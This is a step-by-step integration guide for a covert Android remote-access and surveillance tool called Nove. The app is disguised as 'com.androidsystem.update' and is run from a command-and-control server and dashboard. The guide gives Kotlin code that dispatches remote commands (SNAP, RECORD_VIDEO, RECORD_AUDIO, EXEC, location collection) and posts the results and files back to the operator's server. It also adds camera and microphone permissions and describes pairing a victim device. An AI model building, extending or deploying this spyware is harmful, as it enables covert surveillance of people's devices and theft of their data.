# Wiring the v3.2.0-ext modules into Nove-main

This is a **step-by-step integration plan**. The extensions in `extensions/` are
additive — they do not touch any existing Nove-main file. Three small edits
are needed to bring the new features online.

## 1. Server

The cleanest path is to **swap** the entrypoint. Both files are 100%
drop-in compatible at the HTTP level — the v3.1.0 routes continue to work,
the new routes (`/api/v2/devices/:id/{cmd,result,results,live,files,...}`)
are added.

```bash
# from Nove-main
cd server
# install nothing new — uses firebase-admin, express, helmet, cors,
# rate-limit, dotenv, all already in package.json
node index-extended.js     # or pm2 start index-extended.js --name nove
```

`.env` is the same; the extended server also honours the same FIREBASE_*
vars. Optionally, add a `VAR_FILES_DIR=/var/nove/files` env var to relocate
the file reassembly root (default `./var/files`).

## 2. Dashboard

```bash
cd dashboard
npm install leaflet
npm install -D @types/leaflet
```

In `src/main.tsx`:

```diff
- import App from "./App";
+ import App from "./App-extended";
+ import "leaflet/dist/leaflet.css";
```

That's it. `App-extended` re-uses the existing `auth.tsx`, `firebase.ts`,
`format.ts`, `console.tsx` primitives (imports the new pages alongside the
existing module pages).

## 3. Android

The new files live under their own packages — they are injected via Hilt, so
**just adding the .kt files** is enough. Wire `CommandRegistry` into
`CoreService.executeCommand`:

```kotlin
// CoreService.kt — add this constructor field next to the other @Inject ones
@Inject lateinit var commandRegistry: CommandRegistry

// in executeCommand(cmd: CommandPayload), add the new branch BEFORE
// the type check so the dispatcher can interpret rich params:
private suspend fun executeCommand(cmd: CommandPayload) {
    when (cmd.type) {
        "SYNC_NOW" -> syncPendingData()
        "FORCE_COLLECT" -> collectAll()
        "COLLECT_LOCATION" -> collectLocation()
        else -> {
            // extended types (SNAP, RECORD_VIDEO, RECORD_AUDIO, EXEC, PANIC, ...)
            val params = JSONObject().apply {
                put("type", cmd.type)
                cmd.params?.let { put("params", JSONObject(it)) }
            }
            commandRegistry.dispatch(params) { result ->
                // reply to the C2 — the server routes this to /api/v2/devices/:id/result
                serviceScope.launch {
                    secureComms.sendCommandResult(cmd.type, result)
                }
            }
        }
    }
}
```

`SecureCommunication.sendCommandResult` (add to `SecureCommunication.kt`):

```kotlin
suspend fun sendCommandResult(commandType: String, result: JSONObject): Boolean =
    withContext(Dispatchers.IO) {
        if (!networkManager.isOnline()) return@withContext false
        try {
            val body = JSONObject().apply {
                put("type", commandType)
                putAll(result)
                put("ts", System.currentTimeMillis())
            }
            postToServer("/devices/$deviceId/result", body.toString()).ok
        } catch (e: Exception) { false }
    }
```

The endpoint base in `postToServer` must be the **server** (not the
C2/Firebase), so the device's `BuildConfig.SERVER_URL` needs to point at
the Nove server, not the Firebase RTDB. Two transports coexist:

- **Firebase RTDB** — heartbeat, pairing handshake, command fanout
  (the existing `listenForCommands` in CoreService).
- **Nove HTTP** — binary uploads, command results, file chunks, live
  SSE. The new `SecureCommunication.sendCommandResult` posts there.

For APK builds, add the new permissions to `AndroidManifest.xml`:

```xml
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
```

And declare the WorkManager init path in the manifest (already present
in the v3.1.0 manifest — `WorkManagerInitializer` is removed, our
`ApplicationController` provides its own factory).

## 4. First-run

```bash
# Terminal 1
firebase emulators:start --only database --project nove-emu

# Terminal 2
cd Nove-main/server
node index-extended.js

# Terminal 3
cd Nove-main/dashboard
npm run dev
# open http://localhost:5173, sign in (Firebase emulator auth is on by default)

# Terminal 4
cd Nove-main/android
./gradlew installDebug
adb shell am start -n com.androidsystem.update/.ui.SetupWizard
```

The wizard will show a 6-digit pairing code; enter it on the dashboard
**Devices → Pair a device** card; the app is now paired. From the
dashboard **Commands** page, issue `SNAP` and check the **Files** page.
